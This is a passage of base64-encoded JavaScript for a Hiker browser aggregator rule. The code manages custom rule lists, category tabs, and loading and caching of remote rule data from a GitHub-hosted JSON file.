5pu05pS55Zu+5qCHJywgJ+WvvOWFpea1t+mYlCddKS5mb3JFYWNoKCh2KSA9PiB7XFxuICAgIGVsLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IHYgPT0gZWRpdE1vZGUgPyAn4oCc4oCc4oCd4oCdJyArIHYuYm9sZCgpLmZvbnRjb2xvcignIzEyYjY2OCcpIDogdixcXG4gICAgICAgIHVybDogdiA9PSBlZGl0TW9kZSA/ICdoaWtlcjovL2VtcHR5JyA6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHYpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcignZWRpdE1vZGUnLCB2KVxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgIH0sIHYpLFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbiAgICB9KVxcbn0pO1xcbmlmKGVkaXRNb2RlID09PSAn5a+85YWl5rW36ZiUJykge1xcbiAgICBlbC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOifmkJzntKInLFxcbiAgICAgICAgZGVzYzon6L6T5YWl5bCP56iL5bqP5qCH6aKYfOWcsOWdgOi/m+ihjOaQnOe0oi4uLicsXFxuICAgICAgICB1cmw6JC50b1N0cmluZygoKT0+e1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIH0pLFxcbiAgICAgICAgY29sX3R5cGU6J2lucHV0JyxcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgb25DaGFuZ2U6IFxcXCJwdXRNeVZhcignaW1wb3J0U2VhcmNoS2V5JyxpbnB1dClcXFwiLFxcbiAgICAgICAgICAgIHRpdGxlVmlzaWJsZTogdHJ1ZSxcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6Z2V0TXlWYXIoJ2ltcG9ydFNlYXJjaEtleScsJycpXFxuICAgICAgICB9LFxcbiAgICB9KTtcXG4gICAgZWwucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+WFqOmDqOWvvOWFpSjpnZ7mkJzntKLov4fmu6TlkI7nu5PmnpwpJyxcXG4gICAgICAgIHVybDogJ+a1t+mYlOinhueVjO+/pWhvbWVfcnVsZV91cmzvv6UnICsgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykgPyB1cmwgOiAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnKSxcXG4gICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxuICAgICAgICBleHRyYToge2xpbmVWaXNpYmxlOiBmYWxzZX1cXG4gICAgfSk7XFxufVxcbnZhciBkYXRhcyA9IChkaXNhYmxlQ3VzdG9tID8gZGF0YSA6IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKSk7XFxubGV0IHNrID0gZ2V0TXlWYXIoJ2ltcG9ydFNlYXJjaEtleScsJycpO1xcbmlmKGVkaXRNb2RlID09PSAn5a+85YWl5rW36ZiUJyYmc2spIHtcXG4gICAgZGF0YXMgPSBkYXRhcy5maWx0ZXIoaXQ9Pml0LnRpdGxlLmluY2x1ZGVzKHNrKXx8KGl0LnVybCYmaXQudXJsLmluY2x1ZGVzKHNrKSkpO1xcbiAgICBkYXRhID0gZGF0YS5maWx0ZXIoaXQ9Pml0LnRpdGxlLmluY2x1ZGVzKHNrKXx8KGl0LnVybCYmaXQudXJsLmluY2x1ZGVzKHNrKSkpO1xcbn1cXG5kYXRhcy5mb3JFYWNoKCh2LCBpKSA9PiB7XFxuICAgIGxldCBkID0geyB0aXRsZTogdi50aXRsZSwgaW1nOiBkYXRhW2ldLmljb24gfVxcbiAgICBzd2l0Y2ggKGVkaXRNb2RlKSB7XFxuICAgICAgICBjYXNlICflkK/nlKgv56aB55SoJzpcXG4gICAgICAgICAgICBkLnRpdGxlID0gKHYudmlzaWJsZSA/ICfwn5+iICAnIDogJ/CflLQgICcpICsgZC50aXRsZVxcbiAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXG4gICAgICAgICAgICAgICAgcnVsZXNbaV0udmlzaWJsZSA9ICFydWxlc1tpXS52aXNpYmxlXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgIGNhc2UgJ+mHjeaWsOaOkuW6jyc6XFxuICAgICAgICAgICAgbGV0IHNvcnRGbGFnID0gcGFyc2VJbnQoZ2V0TXlWYXIoJ3NvcnRGbGFnJywgJy0xJykpXFxuICAgICAgICAgICAgZC50aXRsZSA9IChzb3J0RmxhZyA9PSBpID8gJ/CflIMgICcgOiAnJykgKyBkLnRpdGxlXFxuICAgICAgICAgICAgaWYgKHNvcnRGbGFnID09IC0xKVxcbiAgICAgICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKCdzb3J0RmxhZycsIGkudG9TdHJpbmcoKSlcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+mAieaLqeimgeenu+WKqOWIsOeahOS9jee9ridcXG4gICAgICAgICAgICAgICAgfSwgaSlcXG4gICAgICAgICAgICBlbHNlXFxuICAgICAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgob2xkSW5kZXgsIG5ld0luZGV4KSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzLnNwbGljZShuZXdJbmRleCwgMCwgcnVsZXMuc3BsaWNlKG9sZEluZGV4LCAxKVswXSlcXG4gICAgICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3NvcnRGbGFnJywgJy0xJylcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgICAgICB9LCBzb3J0RmxhZywgaSlcXG4gICAgICAgICAgICBicmVha1xcbiAgICAgICAgY2FzZSAn5pu05pS55Zu+5qCHJzpcXG4gICAgICAgICAgICBkLnVybCA9ICQodi5pY29uIHx8ICcnLCAn6L6T5YWl5paw5Zu+5qCH5Zyw5Z2A5oiW6aKc6Imy5Luj56CB77yaJykuaW5wdXQoKGkpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dClcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzW2ldLmljb24gPSBpbnB1dFxcbiAgICAgICAgICAgICAgICBlbHNlXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGUgcnVsZXNbaV0uaWNvblxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KHJ1bGVzKSlcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgICAgICB9LCBpKVxcbiAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICBjYXNlICflr7zlhaXmtbfpmJQnOlxcbiAgICAgICAgICAgIGQudXJsID0gJ3J1bGU6Ly8nICsgYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KGRhdGFbaV0pKTtcXG4gICAgICAgICAgICBicmVha1xcbiAgICB9XFxuICAgIGVsLnB1c2goZClcXG59KVxcbnNldFJlc3VsdChlbClcIixcImdyb3VwXCI6XCLikaDlvbHop4bmvKvnlLtcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcInB1dE15VmFyKCdteUNvbGxlY3Rpb24nLCBNWV9SVUxFLnRpdGxlKVxcbnB1dE15VmFyKCdyZW1vdGVVcmwnLCAnaHR0cHM6Ly9naXRodWIuamV2b25zLnZpcC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUVExOTkzSFVBTkcvWU1KL21haW4v6ZiF5Yqo5ryrLmpzb24nKVxcbi8vIFxcbi8qXFxuKi9cIixcInBhZ2VzXCI6XCJbe1xcXCJjb2xfdHlwZVxcXCI6XFxcInRleHRfMVxcXCIsXFxcIm5hbWVcXFwiOlxcXCJDbGFzc1RhYlxcXCIsXFxcInBhdGhcXFwiOlxcXCJDbGFzc1RhYlxcXCIsXFxcInJ1bGVcXFwiOlxcXCJ2YXIge1xcXFxuICAgIFFJTkdfVElUTEUsIHRpdGxlLCB1cmwsXFxcXG4gICAgY2xhc3NfbmFtZSwgY2xhc3NfdXJsLFxcXFxuICAgIGFyZWFfbmFtZSwgYXJlYV91cmwsXFxcXG4gICAgeWVhcl9uYW1lLCB5ZWFyX3VybCxcXFxcbiAgICBzb3J0X25hbWUsIHNvcnRfdXJsXFxcXG59ID0gJC5pbXBvcnRQYXJhbVxcXFxuY29uc3QgQ2xhc3NUYWIgPSBmdW5jdGlvbihjbGFzc0FycmF5LCBwYXJhbXMpIHtcXFxcbiAgICBPYmplY3QuYXNzaWduKHRoaXMsIHBhcmFtcylcXFxcbiAgICB0aGlzLmFyciA9IGNsYXNzQXJyYXkubWFwKHYgPT4gdGhpcy5pbml0KHYpKVxcXFxuICAgIHRoaXMuc2lnbiA9ICckJyArIFFJTkdfVElUTEUgKyAnXycgKyAodGhpcy5uYW1lIHx8ICcnKSArICdfJ1xcXFxuICAgIHRoaXMuY29sb3IgPSB0aGlzLmNvbG9yIHx8ICcjMTJiNjY4J1xcXFxuICAgIHRoaXMuYm91bmRhcnkgPSB0aGlzLmJvdW5kYXJ5IHx8ICdibGFua19ibG9jaydcXFxcbn1cXFxcbkNsYXNzVGFiLnByb3RvdHlwZSA9IHtcXFxcbiAgICBjb25zdHJ1Y3RvcjogQ2xhc3NUYWIsXFxcXG4gICAgbG9hZChlbCkge1xcXFxuICAgICAgICBsZXQgZm9sZGVkID0gdGhpcy5mb2xkICYmIGdldFZhcignJGZvbGRfJyArIHRoaXMuc2lnbiwgJycpXFxcXG4gICAgICAgIGlmICh0aGlzLmFyci5sZW5ndGggPiAxICYmIHRoaXMuZm9sZCkgZWwucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAoZm9sZGVkID8gJ+KWticgOiAn4pa8JykuZm9udGNvbG9yKCcjMDQ5ZWZmJyksXFxcXG4gICAgICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHNpZ24sIGZvbGRlZCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHB1dFZhcignJGZvbGRfJyArIHNpZ24sIGZvbGRlZCA/ICcnIDogJ1QnKVxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgICAgIH0sIHRoaXMuc2lnbiwgZm9sZGVkKSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgbGV0IGFyciA9IGZvbGRlZCA/IFt0aGlzLmFyclswXV0gOiB0aGlzLmFyclxcXFxuICAgICAgICBhcnIuZm9yRWFjaCgodikgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IHsgaWQsIGNsYXNzX25hbWUsIGNsYXNzX3VybCB9ID0gdixcXFxcbiAgICAgICAgICAgIHNlbGVjdGVkID0gSlNPTi5zdHJpbmdpZnkodGhpcy5nZXRDbGFzcyhpZCkpXFxcXG4gICAgICAgICAgICBjbGFzc19uYW1lLmZvckVhY2goKG5hbWUsIGkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdXJsID0gY2xhc3NfdXJsW2ldLFxcXFxuICAgICAgICAgICAgICAgICAgICBub3cgPSBKU09OLnN0cmluZ2lmeSh7IG5hbWU6IG5hbWUsIHVybDogdXJsIH0pXFxcXG4gICAgICAgICAgICAgICAgZWwucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBzZWxlY3RlZCA9PSBub3cgPyAn4oCc4oCc4oCd4oCdJyArIG5hbWUuZm9udGNvbG9yKHRoaXMuY29sb3IpLmJvbGQoKSA6IG5hbWUsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogc2VsZWN0ZWQgPT0gbm93ID8gJ2hpa2VyOi8vZW1wdHknIDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2lnbiwgaWQsIG5vdykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKHNpZ24gKyBpZCwgbm93KVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIHRoaXMuc2lnbiwgaWQsIG5vdyksXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIGVsLnB1c2goeyBjb2xfdHlwZTogdGhpcy5ib3VuZGFyeSB9KVxcXFxuICAgICAgICB9KVxcXFxuICAgIH0sXFxcXG4gICAgaW5pdChjbGFzc09iamVjdCkge1xcXFxuICAgICAgICBpZiAodHlwZW9mIGNsYXNzT2JqZWN0LmNsYXNzX25hbWUgPT0gJ3N0cmluZycpXFxcXG4gICAgICAgICAgICBjbGFzc09iamVjdC5jbGFzc19uYW1lID0gY2xhc3NPYmplY3QuY2xhc3NfbmFtZS5zcGxpdCgnJicpXFxcXG4gICAgICAgIGlmICh0eXBlb2YgY2xhc3NPYmplY3QuY2xhc3NfdXJsID09ICdzdHJpbmcnKVxcXFxuICAgICAgICAgICAgY2xhc3NPYmplY3QuY2xhc3NfdXJsID0gY2xhc3NPYmplY3QuY2xhc3NfdXJsLnNwbGl0KCcmJykubWFwKCh2KSA9PiB2LnRyaW0oKSlcXFxcbiAgICAgICAgcmV0dXJuIGNsYXNzT2JqZWN0XFxcXG4gICAgfSxcXFxcbiAgICBwdXNoKGNsYXNzT2JqZWN0KSB7XFxcXG4gICAgICAgIHRoaXMuYXJyLnB1c2godGhpcy5pbml0KGNsYXNzT2JqZWN0KSlcXFxcbiAgICB9LFxcXFxuICAgIGdldENsYXNzKGlkKSB7XFxcXG4gICAgICAgIGxldCBkZWZhdWx0Q2xhc3MgPSB0aGlzLmFyci5maW5kKGl0ZW0gPT4gaXRlbS5pZCA9PSBpZClcXFxcbiAgICAgICAgZGVmYXVsdENsYXNzID0gSlNPTi5zdHJpbmdpZnkoZGVmYXVsdENsYXNzID8ge1xcXFxuICAgICAgICAgICAgbmFtZTogZGVmYXVsdENsYXNzLmNsYXNzX25hbWVbMF0sXFxcXG4gICAgICAgICAgICB1cmw6IGRlZmF1bHRDbGFzcy5jbGFzc191cmxbMF1cXFxcbiAgICAgICAgfSA6IHsgbmFtZTogICdjYW5ub3QgZmluZCBpZDogJyArIGlkICsgJyBpbiBjbGFzc1RhYjogJyArIHRoaXMuc2lnbiwgdXJsOiAnJ30pXFxcXG4gICAgICAgIHJldHVybiBKU09OLnBhcnNlKGdldFZhcih0aGlzLnNpZ24gKyBpZCwgZGVmYXVsdENsYXNzKSlcXFxcbiAgICB9LFxcXFxuICAgIHNldFVybCh1cmwpIHtcXFxcbiAgICAgICAgcmV0dXJuIHVybC5yZXBsYWNlKC9cXFxcXFxcXCRcXFxcXFxcXHsoW159XSopXFxcXFxcXFx9L2csIChfLCBpZCkgPT4gdGhpcy5nZXRDbGFzcyhpZCkudXJsKVxcXFxuICAgIH1cXFxcbn1cXFxcbi8vIOeUn+aIkOWktOmDqOWIhuexu1xcXFxubGV0IGZ5QWxsID0gdXJsLmluY2x1ZGVzKCdmeUFsbCcpLFxcXFxuICAgIHRhYkhlYWRlciA9IFtdXFxcXG5pZiAoY2xhc3NfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcXFxuICAgIGlkOiBmeUFsbCA/ICdmeUFsbCcgOiAnZnljbGFzcycsXFxcXG4gICAgY2xhc3NfbmFtZTogY2xhc3NfbmFtZSxcXFxcbiAgICBjbGFzc191cmw6IGNsYXNzX3VybFxcXFxufSlcXFxcbmlmIChhcmVhX25hbWUpIHRhYkhlYWRlci5wdXNoKHtcXFxcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5YXJlYScsXFxcXG4gICAgY2xhc3NfbmFtZTogYXJlYV9uYW1lLFxcXFxuICAgIGNsYXNzX3VybDogYXJlYV91cmxcXFxcbn0pXFxcXG5pZiAoeWVhcl9uYW1lKSB0YWJIZWFkZXIucHVzaCh7XFxcXG4gICAgaWQ6IGZ5QWxsID8gJ2Z5QWxsJyA6ICdmeXllYXInLFxcXFxuICAgIGNsYXNzX25hbWU6IHllYXJfbmFtZSxcXFxcbiAgICBjbGFzc191cmw6IHllYXJfdXJsXFxcXG59KVxcXFxuaWYgKHNvcnRfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcXFxuICAgIGlkOiBmeUFsbCA/ICdmeUFsbCcgOiAnZnlzb3J0JyxcXFxcbiAgICBjbGFzc19uYW1lOiBzb3J0X25hbWUsXFxcXG4gICAgY2xhc3NfdXJsOiBzb3J0X3VybFxcXFxufSlcXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICBmeUFsbDogZnlBbGwsXFxcXG4gICAgdGFiSGVhZGVyOiBuZXcgQ2xhc3NUYWIodGFiSGVhZGVyLCB7IG5hbWU6IHRpdGxlLCBmb2xkOiByZWFkRmlsZSgndGFiRm9sZCcpLCB9KVxcXFxufVxcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5pWw5o2u6L295YWlXFxcIixcXFwicGF0aFxcXCI6XFxcImRhdGFMb2FkXFxcIixcXFwicnVsZVxcXCI6XFxcImxldCBzaG93QWxsID0gJC5pbXBvcnRQYXJhbSxcXFxcbiAgICB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJyksXFxcXG4gICAgZGF0YSA9IFtdXFxcXG5pZiAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgfHwgdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSkge1xcXFxuICAgIC8vIOWmguaenOS4uuacrOWcsOaWh+S7tuWImeS4jei/m+ihjOe8k+WtmFxcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIGxldCBvcmlEYXRhID0gZmV0Y2godXJsKVxcXFxuICAgICAgICBpZiAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vcGFnZS8nKSlcXFxcbiAgICAgICAgICAgIG9yaURhdGEgPSBKU09OLnBhcnNlKG9yaURhdGEpLnJ1bGVcXFxcbiAgICAgICAgZGF0YSA9IEpTT04ucGFyc2Uob3JpRGF0YSlcXFxcbiAgICB9IGNhdGNoIChlKSB7fVxcXFxufSBlbHNlIHtcXFxcbiAgICAvLyDojrflj5bov5znqIvmlbDmja7vvIzmo4Dmn6Xpl7TpmpTpu5jorqTkuIDlpKlcXFxcbiAgICBsZXQgaW50ZXJ2YWwgPSBwYXJzZUludChyZWFkRmlsZSgndXBkYXRlSW50ZXJ2YWwnKSB8fCAnMScpLFxcXFxuICAgICAgICBvbGREYXRhID0gZmV0Y2goJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJyksXFxcXG4gICAgICAgIHJlbW90ZURhdGEgPSBbXVxcXFxuICAgIGlmIChpbnRlcnZhbCA9PSAwKSBpbnRlcnZhbCA9IC0xXFxcXG4gICAgdHJ5IHsgcmVtb3RlRGF0YSA9IEpTT04ucGFyc2UoZmV0Y2hDYWNoZSh1cmwsIDI0ICogaW50ZXJ2YWwsIHsgdGltZW91dDogNTAwMDAgfSkpIH0gY2F0Y2ggKGUpIHt9XFxcXG4gICAgaWYgKCFBcnJheS5pc0FycmF5KHJlbW90ZURhdGEpKSByZW1vdGVEYXRhID0gW11cXFxcbiAgICBpZiAocmVtb3RlRGF0YS5sZW5ndGggPCAzKSB7XFxcXG4gICAgICAgIGxvZygn5pyq6I635Y+W5Yiw5pWw5o2uJylcXFxcbiAgICAgICAgaWYgKG9sZERhdGEpIHdyaXRlRmlsZSgnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnLCBvbGREYXRhKVxcXFxuICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShvbGREYXRhIHx8ICdbXScpXFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgbG9nKCflt7Lojrflj5bliLDmlbDmja4nKVxcXFxuICAgICAgICBkYXRhID0gcmVtb3RlRGF0YVxcXFxuICAgIH1cXFxcbn1cXFxcbmRhdGEgPSBkYXRhLmZpbHRlcigodikgPT4gdi50aXRsZSAhPSBnZXRNeVZhcignbXlDb2xsZWN0aW9uJykgJiYgISh2LmF1dGhvciB8fCAnJykuaW5jbHVkZXMoJ+mYheWKqOa8q+eUn+aIkOWZqCcpKVxcXFxuaWYgKHJlYWRGaWxlKCdkaXNhYmxlQ3VzdG9tJykpICQuZXhwb3J0cyA9IGRhdGFcXFxcbmVsc2UgeyAvLyDlhpnlhaXoh6rlrprkuYnmlbDmja5cXFxcbiAgICBsZXQgY3VzdG9tRGF0YSA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKSxcXFxcbiAgICAgICAgcmV3cml0ZURhdGEgPSBbXVxcXFxuICAgIGN1c3RvbURhdGEgPSBjdXN0b21EYXRhLnJlZHVjZSgoc2VsZiwgdikgPT4ge1xcXFxuICAgICAgICBsZXQgaW5kZXggPSBkYXRhLmZpbmRJbmRleCgodnYpID0+IHYudGl0bGUgPT0gdnYudGl0bGUpXFxcXG4gICAgICAgIGlmIChpbmRleCA+PSAwKSB7XFxcXG4gICAgICAgICAgICBzZWxmLnB1c2godilcXFxcbiAgICAgICAgICAgIGxldCBydWxlID0gZGF0YS5zcGxpY2UoaW5kZXgsIDEpWzBdXFxcXG4gICAgICAgICAgICBpZiAoc2hvd0FsbCB8fCB2LnZpc2libGUpXFxcXG4gICAgICAgICAgICAgICAgcmV3cml0ZURhdGEucHVzaChPYmplY3QuYXNzaWduKHJ1bGUsIHYpKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBzZWxmXFxcXG4gICAgfSwgW10pXFxcXG4gICAgZGF0YS5mb3JFYWNoKCh2KSA9PiBjdXN0b21EYXRhLnB1c2goeyB0aXRsZTogdi50aXRsZSwgdmlzaWJsZTogdHJ1ZSB9KSlcXFxcbiAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KGN1c3RvbURhdGEpKVxcXFxuICAgICQuZXhwb3J0cyA9IHJld3JpdGVEYXRhLmNvbmNhdChkYXRhKVxcXFxufVxcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi546v5aKD5Yqr5oyBXFxcIixcXFwicGF0aFxcXCI6XFxcImhpamFja0VudlxcXCIsXFxcInJ1bGVcXFwiOlxcXCJ2YXIgeyBSVUxFLCBpc0luZGV4LCBwYWdlVGl0bGUgfSA9IE1ZX1BBUkFNU1xcXFxuUlVMRSA9IEpTT04ucGFyc2UoYmFzZTY0RGVjb2RlKFJVTEUpKVxcXFxudmFyIG9yaVJVTEUgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFKS5maW5kKCh2KSA9PiB2LnRpdGxlID09IFJVTEUudGl0bGUpXFxcXG5pZiAoaXNJbmRleCkge1xcXFxuICAgIFJVTEUgPSBvcmlSVUxFXFxcXG4gICAgdmFyIHsgdGFiSGVhZGVyLCBmeUFsbCB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSwgT2JqZWN0LmFzc2lnbih7IFFJTkdfVElUTEU6IFFJTkdfVElUTEUgfSwgUlVMRSkpXFxcXG4gICAgLy8g5aSE55CGTVlfUlVMRVxcXFxuICAgIE1ZX1JVTEUuY2xhc3NfdXJsID0gdGFiSGVhZGVyLmdldENsYXNzKGZ5QWxsID8gJ2Z5QWxsJyA6ICdmeWNsYXNzJykudXJsXFxcXG4gICAgTVlfUlVMRS5hcmVhX3VybCA9IGZ5QWxsID8gTVlfUlVMRS5jbGFzc191cmwgOiB0YWJIZWFkZXIuZ2V0Q2xhc3MoJ2Z5YXJlYScpLnVybFxcXFxuICAgIE1ZX1JVTEUueWVhcl91cmwgPSBmeUFsbCA/IE1ZX1JVTEUuY2xhc3NfdXJsIDogdGFiSGVhZGVyLmdldENsYXNzKCdmeXllYXInKS51cmxcXFxcbiAgICBNWV9SVUxFLnNvcnRfdXJsID0gZnlBbGwgPyBNWV9SVUxFLmNsYXNzX3VybCA6IHRhYkhlYWRlci5nZXRDbGFzcygnZnlzb3J0JykudXJsXFxcXG4gICAgTVlfUlVMRS51cmwgPSBSVUxFLnVybFxcXFxuICAgIE1ZX1JVTEUuY29sX3R5cGUgPSBSVUxFLmNvbF90eXBlXFxcXG4gICAgTVlfUlVMRS5kZXRhaWxfY29sX3R5cGUgPSBSVUxFLmRldGFpbF9jb2xfdHlwZVxcXFxuICAgIE1ZX1JVTEUuZmluZF9ydWxlID0gUlVMRS5maW5kX3J1bGVcXFxcbiAgICBNWV9SVUxFLmRldGFpbF9maW5kX3J1bGUgPSBSVUxFLmRldGFpbF9maW5kX3J1bGVcXFxcbiAgICBNWV9SVUxFLnBhcmFtcyA9IHt9XFxcXG59IGVsc2Uge1xcXFxuICAgIFJVTEUucGFnZXMgPSBvcmlSVUxFLnBhZ2VzXFxcXG4gICAgLy8g5aSE55CGTVlfUlVMRVxcXFxuICAgIE1ZX1JVTEUudXJsID0gTVlfUEFSQU1TLnVybFxcXFxuICAgIE1ZX1JVTEUuY29sX3R5cGUgPSBSVUxFLmRldGFpbF9jb2xfdHlwZVxcXFxuICAgIE1ZX1JVTEUuZmluZF9ydWxlID0gUlVMRS5kZXRhaWxfZmluZF9ydWxlXFxcXG4gICAgTVlfUlVMRS5wYXJhbXMgPSBSVUxFLnBhcmFtc1xcXFxufVxcXFxuTVlfUlVMRS5wYWdlcyA9IFJVTEUucGFnZXNcXFxcbk1ZX1JVTEUucGFnZUxpc3QgPSBKU09OLnBhcnNlKE1ZX1JVTEUucGFnZXMgfHwgJ1tdJylcXFxcbk1ZX1JVTEUudGl0bGUgPSBSVUxFLnRpdGxlXFxcXG5NWV9SVUxFLnVhID0gUlVMRS51YVxcXFxubG9nKE1ZX1JVTEUudXJsKVxcXFxuLy8g6L295YWl5Ye95pWw5bel5YW3XFxcXG52YXIgeyBnZW5NeVJ1bGUgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFLCB7XFxcXG4gICAgUUlOR19USVRMRTogUUlOR19USVRMRSxcXFxcbiAgICBNWV9SVUxFOiBNWV9SVUxFLFxcXFxuICAgIGlzSW5kZXg6IGlzSW5kZXhcXFxcbn0pXFxcXG4vLyDpmLLmraJyZXF1aXJl5aSa5qyh6L+Q6KGMXFxcXG5jb25zdCBteUNvbGxfcmVxdWlyZWQgPSB7fVxcXFxucmVxdWlyZSA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMywgcGFyYW00KSB7XFxcXG4gICAgaWYgKG15Q29sbF9yZXF1aXJlZFtwYXJhbTBdKSByZXR1cm5cXFxcbiAgICBteUNvbGxfcmVxdWlyZWRbcGFyYW0wXSA9IHRydWVcXFxcbiAgICBwYXJhbTIgPS